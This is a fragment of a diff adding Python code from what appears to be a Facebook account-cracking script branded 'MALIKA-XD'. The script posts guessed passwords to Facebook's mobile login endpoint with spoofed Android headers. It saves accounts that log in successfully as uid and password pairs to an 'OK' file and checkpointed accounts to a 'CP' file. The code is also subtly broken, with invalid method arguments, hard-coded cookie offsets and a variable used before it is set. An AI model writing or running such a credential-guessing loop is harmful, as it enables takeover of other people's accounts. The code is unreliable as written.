@@ -1,0 +1,34 @@
+'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'cross-site',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com//login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict(1).keys(1)
+            #print(iid+'|'+pws+'|'+str(log_cookies))
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict(1).items(1)])
+                uid = coki[151:166]
+                print('\033[1;32m[MALIKA-XD -OK] '+uid+'|'+ps+'\033[0;97m')
+                open('MALIKA-XD -OK.txt', 'a').write(uid+' | '+ps+ '\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict(1).items(1)])
+                cid = coki[141:152]
+                print('\033[1;31m[MALIKA-XD -CP] '+uid+' | '+ps+'\x1b[1;97m')
+                open('MALIKA-XD -CP.txt', 'a').write(uid+' | '+ps+'\n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r[\033[1;97mHINA-XD \033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
+        sys.stdout.flush(malika)
+    except:
+        pass
+
+usman(malikA)
